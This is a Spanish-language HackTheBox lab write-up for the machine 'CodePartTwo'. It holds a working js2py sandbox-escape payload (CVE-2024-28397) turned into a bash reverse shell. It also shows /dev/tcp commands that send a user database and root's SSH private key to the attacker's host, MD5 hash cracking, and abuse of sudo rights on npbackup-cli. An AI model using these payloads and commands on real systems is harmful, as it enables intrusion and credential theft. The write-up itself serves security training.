---
title: CodePartTwo - Easy (HTB)
permalink: /CodePartTwo-HTB-Writeup/
tags:
  - Linux
  - Easy
  - js2py
  - CVE-2024-28397
  - npbackup-cli
  - "Sudoers"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: CodePartTwo - Easy (HTB)
seo_description: Explota CVE-2024-28397 en la librería js2py de Python y abusa de privilegios configurados con sudo para vencer CodePartTwo.
excerpt: Explota CVE-2024-28397 en la librería js2py de Python y abusa de privilegios configurados con sudo para vencer CodePartTwo.
header:
  overlay_image: /assets/images/headers/codeparttwo-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/codeparttwo-hackthebox.jpg
---
![image-center](/assets/images/posts/codeparttwo-hackthebox.png)
{: .align-center}

**Habilidades:** Code Analysis, CVE-2024-28397 - `js2py` Sandbox Escape Bypassing `pyimport` Restriction, SQLite Database Analysis, Hash Cracking, Abusing Sudoers Privileges - `npbackup-cli` [Privilege Escalation]
{: .notice--primary}

# Introducción

CodePartTwo es una máquina Linux de dificultad `Easy` en HackTheBox donde debemos vulnerar una aplicación web explotando CVE-2024-28397, el cual afecta a la librería `js2py` de Python para eludir restricciones de `sandbox`. 

Una vez ganamos acceso abusaremos de privilegios excesivos con `sudo` sobre el binario `npbackup-cli` para obtener acceso privilegiado y persistente. 
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.82 
PING 10.10.11.82 (10.10.11.82) 56(84) bytes of data.
64 bytes from 10.10.11.82: icmp_seq=1 ttl=63 time=178 ms

--- 10.10.11.82 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 178.094/178.094/178.094/0.000 ms
~~~


## Port Scanning 

Comenzaremos con un escaneo de puertos que por ahora únicamente nos muestre puertos abiertos en la máquina víctima

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.82 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 18:45 EDT
Nmap scan report for 10.10.11.82
Host is up (0.19s latency).
Not shown: 65518 closed tcp ports (reset), 15 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Solamente logramos ver dos servicios expuestos, `ssh` y `http`. Realizaremos un escaneo que identifique la versión y los servicios de los puertos que descubrimos

~~~ bash
nmap -p 22,8000 -sVC 10.10.11.82 -oN services  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 18:46 EDT
Nmap scan report for 10.10.11.82
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis

Antes de ver el contenido de la web podemos lanzar un escaneo para identificar tecnologías web que se puedan estar ejecutando en el servicio HTTP

~~~ bash
whatweb http://10.10.11.82:8000

http://10.10.11.82:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.10.11.82], Script, Title[Welcome to CodePartTwo]
~~~

Al visitar la web desde el navegador, veremos que se trata de una plataforma que nos permite ejecutar código `javascript`

![image-center](/assets/images/posts/codeparttwo-1-hackthebox.png)
{: .align-center}

Podemos registrar usuarios, en mi caso registré rápidamente desde el botón `Register` e inicié sesión. El servidor nos mostrará la siguiente web

![image-center](/assets/images/posts/codeparttwo-2-hackthebox.png)
{: .align-center}


## Source Code Analysis

Podemos descargar el código fuente desde el botón `Download App`, donde se realiza una solicitud HTTP al endpoint `/download`. Alternativamente podemos ejecutar `curl` para descargar el archivo comprimido

~~~ bash
curl -s http://10.10.11.82:8000/download -o app.zip
~~~

Extraemos los archivos con la herramienta `7z`

~~~ bash
7z x app.zip

tree app   
            
app
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files
~~~

Podemos darnos cuenta que la aplicación web está montada en `Flask` al consultar el archivo `app.py`

~~~ python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
...
...
...  
~~~

En el siguiente fragmento vemos la lógica aplicada a ejecutar el código en la web

~~~ python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
~~~

Al parecer se utiliza la librería `js2py` para ejecutar el código que enviamos a la web

> `js2py` es una librería de Python que traduce `javascript` en código `python`. Js2Py es capaz de traducir y ejecutar prácticamente cualquier código JavaScript. 
{: .notice--info}

En los archivos del proyecto, veremos uno que contiene versiones de las librerías utilizadas

~~~ bash
cat app/requirements.txt

flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
~~~

Buscando por versiones, nos daremos cuenta que la versión utilizada de `js2py` posiblemente sea vulnerable
<br>


# Intrusión / Explotación
---
## CVE-2024-28397 - `js2py` Sandbox Escape Bypassing `pyimport` Restriction

La vulnerabilidad [CVE-2024-28397](https://www.wiz.io/vulnerability-database/cve/cve-2024-28397), permite a un atacante escapar del entorno limitado de ejecución de `javascript` para ejecutar código arbitrario en el sistema.

### Understanding Vulnerability

La librería `js2py` implementa un `sandbox` que en teoría aísla el código `javascript` del entorno de Python.

El fallo es causado por una implementación de una variable global dentro de esta librería, lo que permite a un atacante obtener una referencia de un objeto de Python en el entorno `js2py`, permitiendo escapar del `sandbox` y ejecutar comandos en el host.

A pesar de que la función `js2py.disable_pyimport()` dentro del proyecto está diseñada para bloquear la importación de módulos, este fallo permite la fuga de un objeto Python y así importar librerías que permitan ejecución de comandos en el servidor.

Usaremos parte del código de la siguiente [prueba de concepto](https://raw.githubusercontent.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/refs/heads/main/poc.py), donde el payload consiste en lo siguiente

~~~ js
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
~~~

### Exploiting

Modificaremos ligeramente el payload para ejecutar un comando como `ping` o `curl`, el objetivo es verificar conectividad desde nuestro lado. Cambiaremos el valor de `cmd` por algo como una solicitud HTTP hacia nuestro servidor

~~~ js
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.15.30/443 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()

n11
~~~

Antes de ejecutar el código debemos asegurarnos de iniciar  un listener el cual se encargue de recibir la conexión

~~~ bash
nc -lvnp 443
~~~

Pegaremos el código directamente en el editor y presionaremos el botón `Run Code`

![image-center](/assets/images/posts/codeparttwo-3-hackthebox.png)
{: .align-center}


## Shell as `app`

De esta forma, cuando ejecutemos el `javascript` en la web, veremos cómo la máquina víctima nos envía una consola de `bash`, en este caso como el usuario `app`

~~~ bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.30] from (UNKNOWN) [10.10.11.82] 57824
bash: cannot set terminal process group (852): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$
~~~

### TTY Treatment

Lanzaremos una pseudo-consola que nos permita presionar `Ctrl+C` sin que la shell pase a mejor vida

~~~ bash
app@codeparttwo:~/app$ script /dev/null -c bash  
script /dev/null -c bash
Script started, file is /dev/null
app@codeparttwo:~/app$ ^Z
[1]  + 160215 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo;fg        
[1]  + 160215 continued  nc -lvnp 443
                                     reset xterm
~~~

Para finalizar el tratamiento, ajustaremos las proporciones de la ventana a la nuestra, además de cambiar el valor de `TERM` para limpiar la pantalla con `Ctrl+L`

~~~ bash
app@codeparttwo:~/app$ stty rows 44 columns 184 
app@codeparttwo:~/app$ export TERM=xterm
~~~


## System Enumeration

### Users

Si listamos los usuarios del sistema, notaremos que existe `marco`, el usuario actual (`app`) y `root`

``` bash
marco@codeparttwo:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

### SQLite Database

Dentro de los archivos de la web, encontraremos una base de datos `sqlite`

``` bash
app@codeparttwo:~/app$ ls -la 
total 32
drwxrwxr-x 6 app app 4096 Dec  8 20:45 .
drwxr-x--- 5 app app 4096 Apr  6  2025 ..
-rw-r--r-- 1 app app 3679 Sep  1 13:19 app.py
drwxrwxr-x 2 app app 4096 Dec  8 20:36 instance
drwxr-xr-x 2 app app 4096 Sep  1 13:25 __pycache__
-rw-rw-r-- 1 app app   49 Jan 17  2025 requirements.txt
drwxr-xr-x 4 app app 4096 Sep  1 13:36 static
drwxr-xr-x 2 app app 4096 Sep  1 13:20 templates

app@codeparttwo:~/app$ file instance/users.db
instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
```

Utilizaremos el binario `sqlite3` para enumerar esta base de datos. Comenzaremos por ver las tablas, donde veremos `code_snippet` y `user`

~~~ bash
app@codeparttwo:~/app$ sqlite3 instance/users.db -list '.tables'
code_snippet  user
~~~

Enumerando tanto los registros como la estructura de la tabla `users`, veremos credenciales para un usuario `marco` y `app`

~~~ bash
app@codeparttwo:~/app$ sqlite3 instance/users.db -list 'pragma table_info(user)'
0|id|INTEGER|1||1
1|username|VARCHAR(80)|1||0
2|password_hash|VARCHAR(128)|1||0

app@codetwo:~/app$ sqlite3 instance/users.db -list 'select * from user'
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
~~~

### File Transfer

Podemos transferir el archivo de base de datos aprovechando un socket TCP. Iniciaremos un listener en nuestra máquina para recibir el archivo

``` bash
nc -lvnp 4444 > users.db 
```

Desde la máquina víctima, podemos reenviar el contenido de esta base de datos usando la ruta especial `/dev/tcp`

``` bash
app@codeparttwo:~/app$ cat instance/users.db > /dev/tcp/10.10.16.203/4444
```

Para verificar la transferencia, podemos calcular un hash MD5 en ambas partes, donde deben coincidir

``` bash
app@codeparttwo:~/app$ md5sum instance/users.db 
f52bdcdc3d057dfd2ea202b3efaa55b6  instance/users.db

md5sum users.db  
f52bdcdc3d057dfd2ea202b3efaa55b6  users.db
```


## Hash Cracking

Guardaremos estos hashes en un archivo de la siguiente manera, aplicando una serie de filtros para ver lo que nos interesa. En este caso podemos hacer uso del nombre de usuario para identificar la contraseña

``` bash
sqlite3 users.db -list 'select * from user' | cut -d '|' -f2-3 | tr '|' ':' | tee hashes.txt

marco:649c9d65a206a75f5abe509fe128bce5
app:a97588c0e2fa3a024876339e27aeb42e
```

Intentaremos descifrar estos hashes con herramientas como `john` o `hashcat`

~~~ bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5

Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE4.1 4x5])
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetangelbabylove (marco)
1g 0:00:00:02 DONE (2025-12-08 18:24) 0.3663g/s 5253Kp/s 5253Kc/s 6517KC/s !..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
~~~


## Shell as `marco`

Logramos descifrar la contraseña del usuario `marco`, esta nos permitirá conectarnos por `ssh` como este usuario

~~~ bash
ssh marco@10.10.11.82
marco@10.10.11.82\'s password: 

Last login: Sun Aug 17 21:10:15 2025 from 10.10.15.30
marco@codeparttwo:~$ 
marco@codeparttwo:~$ export TERM=xterm # Limpiar la terminal con Ctrl+L
~~~

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
marco@codeparttwo:~$ cat user.txt 
ff5...
~~~
<br>


# Escalada de Privilegios
---
Podemos comenzar viendo los grupos a los que `marco` pertenece, nos daremos cuenta que forma parte del grupo `backups`

~~~ bash
marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
~~~


## Abusing `Sudoers` Privileges - `npbackup-cli`

Si listamos los privilegios `sudo` configurados, veremos que podemos ejecutar la herramienta [`npbackup`](https://github.com/netinvent/npbackup/wiki/Usage#cli-usage) como cualquier usuario y sin contraseña.

> `npbackup` es una **solución de copia de seguridad de archivos** multiplataforma, segura y eficiente, diseñada tanto para **administradores de sistemas (CLI)** como para **usuarios finales (GUI)**. Se basa en la herramienta `restic` pero añadiendo más funcionalidades. 
{: .notice--info}

~~~ bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
~~~

Dentro del directorio del usuario `marco`, veremos un archivo de configuración de ejemplo para esta herramienta

``` bash
marco@codeparttwo:~$ ls -l
total 12
drwx------ 7 root root  4096 Apr  6  2025 backups
-rw-rw-r-- 1 root root  2893 Jun 18 11:16 npbackup.conf
-rw-r----- 1 root marco   33 Dec  8 21:17 user.txt

marco@codeparttwo:~$ cat npbackup.conf | head
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
```

Crearemos una copia del archivo de configuración para apuntar al directorio `.ssh` del usuario `root`, haremos una copia del archivo `id_rsa`, el cual es la clave privada `ssh`

> El archivo `id_rsa` es la **clave privada** utilizada en la autenticación SSH para acceder a un servidor remoto de forma segura sin necesidad de una contraseña.
{: .notice--info}

~~~ yml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root/.ssh/id_rsa
...
<SNIP>
...
~~~

Lanzamos la herramienta con la flag `-b` y aplicando la configuración que definimos

~~~ bash
marco@codeparttwo:~$ sudo npbackup-cli -c /tmp/pwn.conf -b

2025-08-17 21:36:35,034 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 21:36:35,069 :: INFO :: Loaded config 2CD7E12C in /tmp/pwn.conf
2025-08-17 21:36:35,084 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-08-17 21:36:37,576 :: INFO :: Snapshots listed successfully
2025-08-17 21:36:37,578 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2025-08-17 21:36:37,578 :: INFO :: Runner took 2.49406 seconds for has_recent_snapshot
2025-08-17 21:36:37,578 :: INFO :: Running backup of ['/root/.ssh/id_rsa'] to repo default
2025-08-17 21:36:38,818 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-08-17 21:36:38,818 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-08-17 21:36:38,818 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-08-17 21:36:38,819 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-08-17 21:36:38,819 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-08-17 21:36:38,819 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-08-17 21:36:38,820 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-08-17 21:36:38,820 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-08-17 21:36:38,820 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repository: 3.570 KiB (3.472 KiB stored)

processed 1 files, 2.541 KiB in 0:00
snapshot 9b8e45b8 saved
2025-08-17 21:36:40,296 :: INFO :: Backend finished with success
2025-08-17 21:36:40,299 :: INFO :: Processed 2.5 KiB of data
2025-08-17 21:36:40,300 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-17 21:36:40,300 :: ERROR :: Operation finished with failure
2025-08-17 21:36:40,300 :: INFO :: Runner took 5.217718 seconds for backup
2025-08-17 21:36:40,301 :: INFO :: Operation finished
2025-08-17 21:36:40,309 :: INFO :: ExecTime = 0:00:05.278594, finished, state is: errors.
~~~

Una vez se haya completado la copia, debemos identificar la `snapshot`, necesitaremos el valor `ID`

~~~ bash
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf -s

2025-08-17 22:37:00,094 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-17 22:37:00,119 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-08-17 22:37:00,126 :: INFO :: Listing snapshots of repo default
ID        Time                 Host        Tags        Paths              Size
------------------------------------------------------------------------------------
35a4dac3  2025-04-06 03:50:16  codetwo                 /home/app/app      48.295 KiB
c71c0264  2025-08-17 22:32:46  codetwo                 /root/.ssh/id_rsa  2.541 KiB
------------------------------------------------------------------------------------
2 snapshots
2025-08-17 22:37:01,858 :: INFO :: Snapshots listed successfully
2025-08-17 22:37:01,858 :: INFO :: Runner took 1.732635 seconds for snapshots
2025-08-17 22:37:01,858 :: INFO :: Operation finished
2025-08-17 22:37:01,863 :: INFO :: ExecTime = 0:00:01.771982, finished, state is: success.
~~~

En nuestro caso el  `ID` es `c71c0264`, ahora podemos ver el archivo con las flags `--snapshot-id` y `--dump`

~~~ bash
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf --dump /root/.ssh/id_rsa --snapshot-id c71c0264

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA9apNjja2/vuDV4aaVheXnLbCe7dJBI/l4Lhc0nQA5F9wGFxkvIEy
VXRep4N+ujxYKVfcT3HZYR6PsqXkOrIb99zwr1GkEeAIPdz7ON0pwEYFxsHHnBr+rPAp9d
EaM7OOojou1KJTNn0ETKzvxoYelyiMkX9rVtaETXNtsSewYUj4cqKe1l/w4+MeilBdFP7q
kiXtMQ5nyiO2E4gQAvXQt9bkMOI1UXqq+IhUBoLJOwxoDwuJyqMKEDGBgMoC2E7dNmxwJV
XQSdbdtrqmtCZJmPhsAT678v4bLUjARk9bnl34/zSXTkUnH+bGKn1hJQ+IG95PZ/rusjcJ
hNzr/GTaAntxsAZEvWr7hZF/56LXncDxS0yLa5YVS8YsEHerd/SBt1m5KCAPGofMrnxSSS
...
<SNIP>
... 
~~~

### File Transfer

Podemos redirigir la salida hacia nuestra máquina abriendo un socket TCP con la ruta espacial `/dev/tcp`.

Primeramente iniciaremos un listener en nuestra máquina por un puerto determinado, en mi caso he elegido el `443`, y exportamos todo lo que reciba a un archivo `id_rsa`

~~~ bash
nc -lvnp 443 > id_rsa
~~~

Ahora desde la máquina víctima, volvemos a consultar el contenido del archivo que está dentro del `snapshot` que hicimos, pero ahora lo redirigimos hacia nuestra máquina con una conexión TCP

~~~ bash
marco@codeparttwo:~$ sudo npbackup-cli -c npbackup.conf --dump /root/.ssh/id_rsa --snapshot-id c71c0264 > /dev/tcp/10.10.15.30/443
~~~


## Root Time

Cuando recibamos la conexión en nuestro listener, una vez concluida, debemos cambiar los permisos del archivo `id_rsa` para evitar conflictos con `ssh`

~~~ bash
chmod 600 id_rsa
~~~

Finalmente, podremos utilizar el archivo de clave privada para conectarnos a la máquina por `ssh` como el usuario `root` y sin proporcionar una contraseña

~~~ bash
ssh -i id_rsa root@10.10.11.82
Last login: Sun Aug 17 22:23:33 2025 from 10.10.15.30       

root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Ya podremos ver la flag ubicada en el directorio `/root`

~~~ bash
root@codeparttwo:~# cat root.txt 
11a...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> I have just three things to teach: simplicity, patience, compassion. These three are your greatest treasures.
> — Lao Tzu
{: .notice--info}
